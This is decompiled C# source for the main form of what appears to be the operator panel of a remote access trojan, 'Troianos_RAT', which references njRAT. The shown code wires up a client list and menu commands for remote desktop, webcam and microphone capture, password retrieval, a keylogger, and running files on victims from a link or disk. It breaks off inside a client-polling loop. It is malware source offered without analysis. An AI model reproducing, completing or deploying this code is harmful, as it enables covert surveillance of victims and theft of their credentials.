using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Troianos_RAT.My;
using Troianos_RAT.My.Resources;
using Troianos_RAT.NJRAT;
using Troianos_RAT.njRAT;
using WinMM;

namespace Troianos_RAT
{
	// Token: 0x0200000E RID: 14
	[DesignerGenerated]
	public partial class Form1 : Form
	{
		// Token: 0x060000F2 RID: 242 RVA: 0x001E120C File Offset: 0x001DF60C
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Form1.__ENCList;
			lock (_ENCList)
			{
				bool flag = Form1.__ENCList.Count == Form1.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = Form1.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = Form1.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								Form1.__ENCList[num] = Form1.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					Form1.__ENCList.RemoveRange(num, Form1.__ENCList.Count - num);
					Form1.__ENCList.Capacity = Form1.__ENCList.Count;
				}
				Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x1700004F RID: 79
		// (get) Token: 0x060000F5 RID: 245 RVA: 0x001E445C File Offset: 0x001E285C
		// (set) Token: 0x060000F6 RID: 246 RVA: 0x001E4474 File Offset: 0x001E2874
		internal virtual StatusStrip StatusStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._StatusStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._StatusStrip1 = value;
			}
		}

		// Token: 0x17000050 RID: 80
		// (get) Token: 0x060000F7 RID: 247 RVA: 0x001E4480 File Offset: 0x001E2880
		// (set) Token: 0x060000F8 RID: 248 RVA: 0x001E4498 File Offset: 0x001E2898
		internal virtual ToolStripStatusLabel ToolStripStatusLabel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripStatusLabel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripStatusLabel1_Click);
				bool flag = this._ToolStripStatusLabel1 != null;
				if (flag)
				{
					this._ToolStripStatusLabel1.Click -= value2;
				}
				this._ToolStripStatusLabel1 = value;
				flag = (this._ToolStripStatusLabel1 != null);
				if (flag)
				{
					this._ToolStripStatusLabel1.Click += value2;
				}
			}
		}

		// Token: 0x17000051 RID: 81
		// (get) Token: 0x060000F9 RID: 249 RVA: 0x001E44F8 File Offset: 0x001E28F8
		// (set) Token: 0x060000FA RID: 250 RVA: 0x001E4510 File Offset: 0x001E2910
		internal virtual ToolStripStatusLabel ToolStripStatusLabel3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripStatusLabel3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripStatusLabel3_Click);
				bool flag = this._ToolStripStatusLabel3 != null;
				if (flag)
				{
					this._ToolStripStatusLabel3.Click -= value2;
				}
				this._ToolStripStatusLabel3 = value;
				flag = (this._ToolStripStatusLabel3 != null);
				if (flag)
				{
					this._ToolStripStatusLabel3.Click += value2;
				}
			}
		}

		// Token: 0x17000052 RID: 82
		// (get) Token: 0x060000FB RID: 251 RVA: 0x001E4570 File Offset: 0x001E2970
		// (set) Token: 0x060000FC RID: 252 RVA: 0x001E4588 File Offset: 0x001E2988
		internal virtual ToolStripStatusLabel ToolStripStatusLabel5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripStatusLabel5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripStatusLabel5_Click);
				bool flag = this._ToolStripStatusLabel5 != null;
				if (flag)
				{
					this._ToolStripStatusLabel5.Click -= value2;
				}
				this._ToolStripStatusLabel5 = value;
				flag = (this._ToolStripStatusLabel5 != null);
				if (flag)
				{
					this._ToolStripStatusLabel5.Click += value2;
				}
			}
		}

		// Token: 0x17000053 RID: 83
		// (get) Token: 0x060000FD RID: 253 RVA: 0x001E45E8 File Offset: 0x001E29E8
		// (set) Token: 0x060000FE RID: 254 RVA: 0x001E4600 File Offset: 0x001E2A00
		internal virtual ToolStripStatusLabel ToolStripStatusLabel4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripStatusLabel4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripStatusLabel4_Click);
				bool flag = this._ToolStripStatusLabel4 != null;
				if (flag)
				{
					this._ToolStripStatusLabel4.Click -= value2;
				}
				this._ToolStripStatusLabel4 = value;
				flag = (this._ToolStripStatusLabel4 != null);
				if (flag)
				{
					this._ToolStripStatusLabel4.Click += value2;
				}
			}
		}

		// Token: 0x17000054 RID: 84
		// (get) Token: 0x060000FF RID: 255 RVA: 0x001E4660 File Offset: 0x001E2A60
		// (set) Token: 0x06000100 RID: 256 RVA: 0x001E4678 File Offset: 0x001E2A78
		internal virtual ToolStripStatusLabel conz
		{
			[DebuggerNonUserCode]
			get
			{
				return this._conz;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._conz = value;
			}
		}

		// Token: 0x17000055 RID: 85
		// (get) Token: 0x06000101 RID: 257 RVA: 0x001E4684 File Offset: 0x001E2A84
		// (set) Token: 0x06000102 RID: 258 RVA: 0x001E469C File Offset: 0x001E2A9C
		internal virtual ToolStripStatusLabel upl
		{
			[DebuggerNonUserCode]
			get
			{
				return this._upl;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._upl = value;
			}
		}

		// Token: 0x17000056 RID: 86
		// (get) Token: 0x06000103 RID: 259 RVA: 0x001E46A8 File Offset: 0x001E2AA8
		// (set) Token: 0x06000104 RID: 260 RVA: 0x001E46C0 File Offset: 0x001E2AC0
		internal virtual ToolStripStatusLabel dwn
		{
			[DebuggerNonUserCode]
			get
			{
				return this._dwn;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._dwn = value;
			}
		}

		// Token: 0x17000057 RID: 87
		// (get) Token: 0x06000105 RID: 261 RVA: 0x001E46CC File Offset: 0x001E2ACC
		// (set) Token: 0x06000106 RID: 262 RVA: 0x001E46E4 File Offset: 0x001E2AE4
		internal virtual ContextMenuStrip ContextMenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip1 = value;
			}
		}

		// Token: 0x17000058 RID: 88
		// (get) Token: 0x06000107 RID: 263 RVA: 0x001E46F0 File Offset: 0x001E2AF0
		// (set) Token: 0x06000108 RID: 264 RVA: 0x001E4708 File Offset: 0x001E2B08
		internal virtual ToolStripMenuItem ManagerToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ManagerToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ManagerToolStripMenuItem_Click);
				bool flag = this._ManagerToolStripMenuItem != null;
				if (flag)
				{
					this._ManagerToolStripMenuItem.Click -= value2;
				}
				this._ManagerToolStripMenuItem = value;
				flag = (this._ManagerToolStripMenuItem != null);
				if (flag)
				{
					this._ManagerToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000059 RID: 89
		// (get) Token: 0x06000109 RID: 265 RVA: 0x001E4768 File Offset: 0x001E2B68
		// (set) Token: 0x0600010A RID: 266 RVA: 0x001E4780 File Offset: 0x001E2B80
		internal virtual ToolStripMenuItem RunFileToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RunFileToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RunFileToolStripMenuItem = value;
			}
		}

		// Token: 0x1700005A RID: 90
		// (get) Token: 0x0600010B RID: 267 RVA: 0x001E478C File Offset: 0x001E2B8C
		// (set) Token: 0x0600010C RID: 268 RVA: 0x001E47A4 File Offset: 0x001E2BA4
		internal virtual ToolStripMenuItem FromLinkToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._FromLinkToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.FromLinkToolStripMenuItem_Click);
				bool flag = this._FromLinkToolStripMenuItem != null;
				if (flag)
				{
					this._FromLinkToolStripMenuItem.Click -= value2;
				}
				this._FromLinkToolStripMenuItem = value;
				flag = (this._FromLinkToolStripMenuItem != null);
				if (flag)
				{
					this._FromLinkToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700005B RID: 91
		// (get) Token: 0x0600010D RID: 269 RVA: 0x001E4804 File Offset: 0x001E2C04
		// (set) Token: 0x0600010E RID: 270 RVA: 0x001E481C File Offset: 0x001E2C1C
		internal virtual ToolStripMenuItem FromDiskToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._FromDiskToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.FromDiskToolStripMenuItem_Click);
				bool flag = this._FromDiskToolStripMenuItem != null;
				if (flag)
				{
					this._FromDiskToolStripMenuItem.Click -= value2;
				}
				this._FromDiskToolStripMenuItem = value;
				flag = (this._FromDiskToolStripMenuItem != null);
				if (flag)
				{
					this._FromDiskToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700005C RID: 92
		// (get) Token: 0x0600010F RID: 271 RVA: 0x001E487C File Offset: 0x001E2C7C
		// (set) Token: 0x06000110 RID: 272 RVA: 0x001E4894 File Offset: 0x001E2C94
		internal virtual ToolStripMenuItem ScriptToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ScriptToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ScriptToolStripMenuItem_Click);
				bool flag = this._ScriptToolStripMenuItem != null;
				if (flag)
				{
					this._ScriptToolStripMenuItem.Click -= value2;
				}
				this._ScriptToolStripMenuItem = value;
				flag = (this._ScriptToolStripMenuItem != null);
				if (flag)
				{
					this._ScriptToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700005D RID: 93
		// (get) Token: 0x06000111 RID: 273 RVA: 0x001E48F4 File Offset: 0x001E2CF4
		// (set) Token: 0x06000112 RID: 274 RVA: 0x001E490C File Offset: 0x001E2D0C
		internal virtual ToolStripMenuItem RemoteDesktopToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RemoteDesktopToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RemoteDesktopToolStripMenuItem_Click);
				bool flag = this._RemoteDesktopToolStripMenuItem != null;
				if (flag)
				{
					this._RemoteDesktopToolStripMenuItem.Click -= value2;
				}
				this._RemoteDesktopToolStripMenuItem = value;
				flag = (this._RemoteDesktopToolStripMenuItem != null);
				if (flag)
				{
					this._RemoteDesktopToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700005E RID: 94
		// (get) Token: 0x06000113 RID: 275 RVA: 0x001E496C File Offset: 0x001E2D6C
		// (set) Token: 0x06000114 RID: 276 RVA: 0x001E4984 File Offset: 0x001E2D84
		internal virtual ToolStripMenuItem RemoteCamToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RemoteCamToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RemoteCamToolStripMenuItem_Click);
				bool flag = this._RemoteCamToolStripMenuItem != null;
				if (flag)
				{
					this._RemoteCamToolStripMenuItem.Click -= value2;
				}
				this._RemoteCamToolStripMenuItem = value;
				flag = (this._RemoteCamToolStripMenuItem != null);
				if (flag)
				{
					this._RemoteCamToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700005F RID: 95
		// (get) Token: 0x06000115 RID: 277 RVA: 0x001E49E4 File Offset: 0x001E2DE4
		// (set) Token: 0x06000116 RID: 278 RVA: 0x001E49FC File Offset: 0x001E2DFC
		internal virtual ToolStripMenuItem MicrophoneToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._MicrophoneToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.MicrophoneToolStripMenuItem_Click);
				bool flag = this._MicrophoneToolStripMenuItem != null;
				if (flag)
				{
					this._MicrophoneToolStripMenuItem.Click -= value2;
				}
				this._MicrophoneToolStripMenuItem = value;
				flag = (this._MicrophoneToolStripMenuItem != null);
				if (flag)
				{
					this._MicrophoneToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000060 RID: 96
		// (get) Token: 0x06000117 RID: 279 RVA: 0x001E4A5C File Offset: 0x001E2E5C
		// (set) Token: 0x06000118 RID: 280 RVA: 0x001E4A74 File Offset: 0x001E2E74
		internal virtual ToolStripMenuItem GetPasswordsToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GetPasswordsToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.GetPasswordsToolStripMenuItem_Click);
				bool flag = this._GetPasswordsToolStripMenuItem != null;
				if (flag)
				{
					this._GetPasswordsToolStripMenuItem.Click -= value2;
				}
				this._GetPasswordsToolStripMenuItem = value;
				flag = (this._GetPasswordsToolStripMenuItem != null);
				if (flag)
				{
					this._GetPasswordsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000061 RID: 97
		// (get) Token: 0x06000119 RID: 281 RVA: 0x001E4AD4 File Offset: 0x001E2ED4
		// (set) Token: 0x0600011A RID: 282 RVA: 0x001E4AEC File Offset: 0x001E2EEC
		internal virtual ToolStripMenuItem KeyloggerToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._KeyloggerToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.KeyloggerToolStripMenuItem_Click);
				bool flag = this._KeyloggerToolStripMenuItem != null;
				if (flag)
				{
					this._KeyloggerToolStripMenuItem.Click -= value2;
				}
				this._KeyloggerToolStripMenuItem = value;
				flag = (this._KeyloggerToolStripMenuItem != null);
				if (flag)
				{
					this._KeyloggerToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000062 RID: 98
		// (get) Token: 0x0600011B RID: 283 RVA: 0x001E4B4C File Offset: 0x001E2F4C
		// (set) Token: 0x0600011C RID: 284 RVA: 0x001E4B64 File Offset: 0x001E2F64
		internal virtual ToolStripMenuItem OpenChatToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._OpenChatToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.OpenChatToolStripMenuItem_Click);
				bool flag = this._OpenChatToolStripMenuItem != null;
				if (flag)
				{
					this._OpenChatToolStripMenuItem.Click -= value2;
				}
				this._OpenChatToolStripMenuItem = value;
				flag = (this._OpenChatToolStripMenuItem != null);
				if (flag)
				{
					this._OpenChatToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000063 RID: 99
		// (get) Token: 0x0600011D RID: 285 RVA: 0x001E4BC4 File Offset: 0x001E2FC4
		// (set) Token: 0x0600011E RID: 286 RVA: 0x001E4BDC File Offset: 0x001E2FDC
		internal virtual ToolStripMenuItem ServerToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ServerToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ServerToolStripMenuItem = value;
			}
		}

		// Token: 0x17000064 RID: 100
		// (get) Token: 0x0600011F RID: 287 RVA: 0x001E4BE8 File Offset: 0x001E2FE8
		// (set) Token: 0x06000120 RID: 288 RVA: 0x001E4C00 File Offset: 0x001E3000
		internal virtual ToolStripMenuItem UpdateToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._UpdateToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._UpdateToolStripMenuItem = value;
			}
		}

		// Token: 0x17000065 RID: 101
		// (get) Token: 0x06000121 RID: 289 RVA: 0x001E4C0C File Offset: 0x001E300C
		// (set) Token: 0x06000122 RID: 290 RVA: 0x001E4C24 File Offset: 0x001E3024
		internal virtual ToolStripMenuItem FromDISKToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._FromDISKToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.FromDISKToolStripMenuItem1_Click);
				bool flag = this._FromDISKToolStripMenuItem1 != null;
				if (flag)
				{
					this._FromDISKToolStripMenuItem1.Click -= value2;
				}
				this._FromDISKToolStripMenuItem1 = value;
				flag = (this._FromDISKToolStripMenuItem1 != null);
				if (flag)
				{
					this._FromDISKToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x17000066 RID: 102
		// (get) Token: 0x06000123 RID: 291 RVA: 0x001E4C84 File Offset: 0x001E3084
		// (set) Token: 0x06000124 RID: 292 RVA: 0x001E4C9C File Offset: 0x001E309C
		internal virtual ToolStripMenuItem FromLINKToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._FromLINKToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.FromLINKToolStripMenuItem1_Click);
				bool flag = this._FromLINKToolStripMenuItem1 != null;
				if (flag)
				{
					this._FromLINKToolStripMenuItem1.Click -= value2;
				}
				this._FromLINKToolStripMenuItem1 = value;
				flag = (this._FromLINKToolStripMenuItem1 != null);
				if (flag)
				{
					this._FromLINKToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x17000067 RID: 103
		// (get) Token: 0x06000125 RID: 293 RVA: 0x001E4CFC File Offset: 0x001E30FC
		// (set) Token: 0x06000126 RID: 294 RVA: 0x001E4D14 File Offset: 0x001E3114
		internal virtual ToolStripMenuItem UninstallToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._UninstallToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.UninstallToolStripMenuItem_Click);
				bool flag = this._UninstallToolStripMenuItem != null;
				if (flag)
				{
					this._UninstallToolStripMenuItem.Click -= value2;
				}
				this._UninstallToolStripMenuItem = value;
				flag = (this._UninstallToolStripMenuItem != null);
				if (flag)
				{
					this._UninstallToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000068 RID: 104
		// (get) Token: 0x06000127 RID: 295 RVA: 0x001E4D74 File Offset: 0x001E3174
		// (set) Token: 0x06000128 RID: 296 RVA: 0x001E4D8C File Offset: 0x001E318C
		internal virtual ToolStripMenuItem RestartToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RestartToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RestartToolStripMenuItem_Click);
				bool flag = this._RestartToolStripMenuItem != null;
				if (flag)
				{
					this._RestartToolStripMenuItem.Click -= value2;
				}
				this._RestartToolStripMenuItem = value;
				flag = (this._RestartToolStripMenuItem != null);
				if (flag)
				{
					this._RestartToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000069 RID: 105
		// (get) Token: 0x06000129 RID: 297 RVA: 0x001E4DEC File Offset: 0x001E31EC
		// (set) Token: 0x0600012A RID: 298 RVA: 0x001E4E04 File Offset: 0x001E3204
		internal virtual ToolStripMenuItem CloseToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CloseToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CloseToolStripMenuItem_Click);
				bool flag = this._CloseToolStripMenuItem != null;
				if (flag)
				{
					this._CloseToolStripMenuItem.Click -= value2;
				}
				this._CloseToolStripMenuItem = value;
				flag = (this._CloseToolStripMenuItem != null);
				if (flag)
				{
					this._CloseToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700006A RID: 106
		// (get) Token: 0x0600012B RID: 299 RVA: 0x001E4E64 File Offset: 0x001E3264
		// (set) Token: 0x0600012C RID: 300 RVA: 0x001E4E7C File Offset: 0x001E327C
		internal virtual ToolStripMenuItem DisconnectToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._DisconnectToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DisconnectToolStripMenuItem_Click);
				bool flag = this._DisconnectToolStripMenuItem != null;
				if (flag)
				{
					this._DisconnectToolStripMenuItem.Click -= value2;
				}
				this._DisconnectToolStripMenuItem = value;
				flag = (this._DisconnectToolStripMenuItem != null);
				if (flag)
				{
					this._DisconnectToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700006B RID: 107
		// (get) Token: 0x0600012D RID: 301 RVA: 0x001E4EDC File Offset: 0x001E32DC
		// (set) Token: 0x0600012E RID: 302 RVA: 0x001E4EF4 File Offset: 0x001E32F4
		internal virtual ToolStripMenuItem RenameToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RenameToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RenameToolStripMenuItem_Click);
				bool flag = this._RenameToolStripMenuItem != null;
				if (flag)
				{
					this._RenameToolStripMenuItem.Click -= value2;
				}
				this._RenameToolStripMenuItem = value;
				flag = (this._RenameToolStripMenuItem != null);
				if (flag)
				{
					this._RenameToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700006C RID: 108
		// (get) Token: 0x0600012F RID: 303 RVA: 0x001E4F54 File Offset: 0x001E3354
		// (set) Token: 0x06000130 RID: 304 RVA: 0x001E4F6C File Offset: 0x001E336C
		internal virtual ToolStripMenuItem OpenFolderToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._OpenFolderToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.OpenFolderToolStripMenuItem_Click);
				bool flag = this._OpenFolderToolStripMenuItem != null;
				if (flag)
				{
					this._OpenFolderToolStripMenuItem.Click -= value2;
				}
				this._OpenFolderToolStripMenuItem = value;
				flag = (this._OpenFolderToolStripMenuItem != null);
				if (flag)
				{
					this._OpenFolderToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700006D RID: 109
		// (get) Token: 0x06000131 RID: 305 RVA: 0x001E4FCC File Offset: 0x001E33CC
		// (set) Token: 0x06000132 RID: 306 RVA: 0x001E4FE4 File Offset: 0x001E33E4
		internal virtual ImageList IMG2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._IMG2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._IMG2 = value;
			}
		}

		// Token: 0x1700006E RID: 110
		// (get) Token: 0x06000133 RID: 307 RVA: 0x001E4FF0 File Offset: 0x001E33F0
		// (set) Token: 0x06000134 RID: 308 RVA: 0x001E5008 File Offset: 0x001E3408
		internal virtual L1 L1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._L1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				DataGridViewColumnEventHandler value2 = new DataGridViewColumnEventHandler(this.L1_ColumnWidthChanged);
				bool flag = this._L1 != null;
				if (flag)
				{
					this._L1.ColumnWidthChanged -= value2;
				}
				this._L1 = value;
				flag = (this._L1 != null);
				if (flag)
				{
					this._L1.ColumnWidthChanged += value2;
				}
			}
		}

		// Token: 0x1700006F RID: 111
		// (get) Token: 0x06000135 RID: 309 RVA: 0x001E5068 File Offset: 0x001E3468
		// (set) Token: 0x06000136 RID: 310 RVA: 0x001E5080 File Offset: 0x001E3480
		internal virtual Pp1 Pp1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Pp1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Pp1 = value;
			}
		}

		// Token: 0x17000070 RID: 112
		// (get) Token: 0x06000137 RID: 311 RVA: 0x001E508C File Offset: 0x001E348C
		// (set) Token: 0x06000138 RID: 312 RVA: 0x001E50A4 File Offset: 0x001E34A4
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				flag = (this._Timer1 != null);
				if (flag)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		// Token: 0x17000071 RID: 113
		// (get) Token: 0x06000139 RID: 313 RVA: 0x001E5104 File Offset: 0x001E3504
		// (set) Token: 0x0600013A RID: 314 RVA: 0x001E511C File Offset: 0x001E351C
		internal virtual ToolStripMenuItem SacanearToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SacanearToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.SacanearToolStripMenuItem_Click);
				bool flag = this._SacanearToolStripMenuItem != null;
				if (flag)
				{
					this._SacanearToolStripMenuItem.Click -= value2;
				}
				this._SacanearToolStripMenuItem = value;
				flag = (this._SacanearToolStripMenuItem != null);
				if (flag)
				{
					this._SacanearToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000072 RID: 114
		// (get) Token: 0x0600013B RID: 315 RVA: 0x001E517C File Offset: 0x001E357C
		// (set) Token: 0x0600013C RID: 316 RVA: 0x001E5194 File Offset: 0x001E3594
		internal virtual ColorDialog ColorDialog1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColorDialog1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColorDialog1 = value;
			}
		}

		// Token: 0x17000073 RID: 115
		// (get) Token: 0x0600013D RID: 317 RVA: 0x001E51A0 File Offset: 0x001E35A0
		// (set) Token: 0x0600013E RID: 318 RVA: 0x001E51B8 File Offset: 0x001E35B8
		internal virtual ColorDialog ColorDialog2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColorDialog2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColorDialog2 = value;
			}
		}

		// Token: 0x0600013F RID: 319 RVA: 0x001E51C4 File Offset: 0x001E35C4
		public Form1()
		{
			base.Activated += this.Form1_Activated;
			base.Deactivate += this.Form1_Deactivate;
			base.FormClosing += this.Form1_FormClosing;
			base.FormClosing += new FormClosingEventHandler(this.FORM1_CLOSING);
			base.Load += this.Form1_Load;
			Form1.__ENCAddToList(this);
			this.isActive = false;
			this.int_0 = 0;
			this.InitializeComponent();
		}

		// Token: 0x06000140 RID: 320 RVA: 0x001E525C File Offset: 0x001E365C
		public void dsk()
		{
			for (;;)
			{
				int num;
				switch (Class7.class8_0.int_2)
				{
				case 0:
					num = 10;
					break;
				case 1:
					num = 2000;
					break;
				case 2:
					num = 5000;
					break;
				case 3:
					num = 7500;
					break;
				default:
					num = 10000;
					break;
				}
				bool flag = this.isActive & (ulong)GClass7.smethod_0() < 12000UL & this.L1.Columns[0].Width != 0;
				if (flag)
				{
					foreach (DataGridViewRow dataGridViewRow in this.L1.method_3())
					{
						bool flag2 = dataGridViewRow != null;
						if (flag2)
						{
							Client client = (Client)dataGridViewRow.Tag;
							flag2 = (client != null);
							if (flag2)
							{
								bool flag3 = false;
								flag2 = (DateTime.Compare(client.lastPC, DateTime.MinValue) == 0);
								if (flag2)
								{
									flag3 = true;
								}
								else
								{
									flag2 = (DateAndTime.Now.Subtract(client.lastPC).TotalMilliseconds >= (double)num);
